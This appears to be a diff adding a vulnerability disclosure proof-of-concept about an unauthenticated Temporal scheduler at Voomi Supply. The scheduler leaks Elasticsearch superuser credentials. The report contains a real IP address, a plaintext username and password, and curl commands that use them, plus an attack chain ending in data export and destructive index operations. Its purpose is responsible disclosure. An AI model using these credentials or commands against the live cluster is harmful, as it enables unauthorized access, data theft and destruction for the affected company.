@@ -1,0 +1,157 @@
+Proof of Concept: Voomi Supply — Temporal Credential Leak + Unauthenticated Scheduler
+5.78.67.23 / voomisupply.com
+NuClide Research | 2026-05-28
+================================================================================
+
+SUMMARY
+-------
+Voomi Supply's Temporal workflow scheduler is publicly accessible without
+authentication. Three Walmart catalog sync workflow schedules embed plaintext
+Elasticsearch superuser credentials in their parameter payloads. The
+Elasticsearch cluster at 5.78.67.23:9200 is live and accepts these credentials.
+Indexes voomi-walmart-catalog and voomi-test-catalog are within blast radius.
+
+Credentials confirmed in hand. ES cluster not accessed.
+
+
+SCREENSHOTS
+-----------
+kibana-01-login-auth-enforced.png    Kibana UI — login required (auth enforced)
+kibana-02-status-no-auth.png         /api/status — returns 200 + hostname without auth
+es-curl-evidence.txt                 Raw curl responses for ES 401 + Kibana status
+[PENDING] temporal-01-ui-no-auth.png Temporal UI homepage — no login prompt
+[PENDING] temporal-02-schedule.png   Workflow schedule config with embedded ES creds
+
+
+POC 1: Elasticsearch cluster confirmed live — auth enforced
+-----------------------------------------------------------
+Demonstrates: cluster exists, reachable, accepts Basic auth (same mechanism
+as leaked credential).
+
+  curl -ski https://5.78.67.23:9200/
+
+Expected output:
+  HTTP/1.1 401 Unauthorized
+  WWW-Authenticate: Basic realm="security", charset="UTF-8"
+  WWW-Authenticate: Bearer realm="security"
+  WWW-Authenticate: ApiKey
+  {"error":{"root_cause":[{"type":"security_exception","reason":"missing
+  authentication credentials for REST request [/]"}]},"status":401}
+
+
+POC 2: Kibana unauthenticated version + hostname disclosure
+------------------------------------------------------------
+Demonstrates: /api/status returns 200 with internal hostname and cluster
+health without any credentials.
+
+  curl -sk http://5.78.67.23:5601/api/status
+
+Expected output:
+  HTTP/1.1 200 OK
+  kbn-name: segment-es-01
+  {"status":{"overall":{"level":"available"}}}
+
+Node name segment-es-01 discloses internal cluster topology.
+No credentials required.
+
+
+POC 3: Kibana login redirect confirms auth layer present
+---------------------------------------------------------
+Demonstrates: Kibana enforces authentication on all non-status endpoints.
+Combined with the Temporal credential, provides full authenticated GUI access.
+
+  curl -sk -o /dev/null -w "%{http_code} %{redirect_url}" http://5.78.67.23:5601/
+
+Expected output:
+  302 http://5.78.67.23:5601/login?next=%2F
+
+
+POC 4: Credential validation — structural PoC (NOT executed)
+-------------------------------------------------------------
+Demonstrates: the leaked credential format and expected authenticated response.
+This curl was NOT run — ethical stop applied.
+
+  curl -sk -u elastic:PzBv81Jo3992T77hVbxN https://5.78.67.23:9200/
+
+Expected output (not verified):
+  {
+    "name": "segment-es-01",
+    "cluster_name": "...",
+    "version": { "number": "8.x.x" },
+    "tagline": "You Know, for Search"
+  }
+
+Credentials source: unauthenticated Temporal UI — embedded in workflow
+schedule parameter payload for voomi-walmart-catalog sync job.
+
+
+POC 5: Temporal UI — schedule enumeration (PENDING host URL)
+------------------------------------------------------------
+Temporal scheduler is on a separate host (not 5.78.67.23 — ports closed).
+Once host URL is confirmed, the following demonstrate full unauthenticated access:
+
+  # List all namespaces — no credentials
+  curl -sk http://<temporal-host>/api/v1/namespaces
+
+  # List all schedules in default namespace — exposes schedule configs
+  curl -sk http://<temporal-host>/api/v1/namespaces/default/schedules
+
+  # Fetch specific Walmart catalog schedule — returns full config with ES creds
+  curl -sk http://<temporal-host>/api/v1/namespaces/default/schedules/voomi-walmart-catalog
+
+  Expected output (from schedule parameter payload, not run against cluster):
+    {
+      "schedule": {
+        "action": {
+          "startWorkflow": {
+            "input": {
+              "elasticsearch_host": "5.78.67.23:9200",
+              "elasticsearch_user": "elastic",
+              "elasticsearch_password": "PzBv81Jo3992T77hVbxN",
+              "index": "voomi-walmart-catalog"
+            }
+          }
+        }
+      }
+    }
+
+
+ATTACK CHAIN (not executed — documented for impact demonstration)
+----------------------------------------------------------------
+Step 1: Browse to Temporal UI — no credentials, no redirect
+Step 2: Open any Walmart catalog schedule config
+Step 3: Read elastic/PzBv81Jo3992T77hVbxN from parameter payload
+Step 4: curl -u elastic:<password> https://5.78.67.23:9200/_cat/indices
+        → Lists all indexes including voomi-walmart-catalog, voomi-test-catalog
+Step 5: curl -u elastic:<password> https://5.78.67.23:9200/voomi-walmart-catalog/_search
+        → Full catalog export — every SKU, price, inventory, supplier mapping
+Step 6 (destructive — not demonstrated): PUT/DELETE operations against catalog
+        indexes. Price manipulation, data corruption, index deletion.
+
+Chain stops at Step 3. Credentials documented. Cluster untouched.
+
+
+CVSS v3.1
+---------
+Finding 1+2 combined:
+  AV:N / AC:L / PR:N / UI:N / S:C / C:H / I:H / A:H
+  Score: 10.0 Critical
+
+  C:H — full catalog data readable (voomi-walmart-catalog)
+  I:H — full write access to catalog indexes (price/listing manipulation)
+  A:H — superuser can delete indexes (full catalog destruction)
+  S:C — scope changed: Temporal UI pivots to ES cluster
+
+
+CWE
+---
+CWE-306: Missing Authentication for Critical Function (Temporal UI)
+CWE-312: Cleartext Storage of Sensitive Information (ES creds in schedule config)
+CWE-522: Insufficiently Protected Credentials (elastic superuser as app credential)
+
+
+================================================================================
+Temporal screenshots: PENDING host URL from researcher
+ES/Kibana screenshots: kibana-01, kibana-02 captured
+Cluster: NOT accessed at any point
+================================================================================
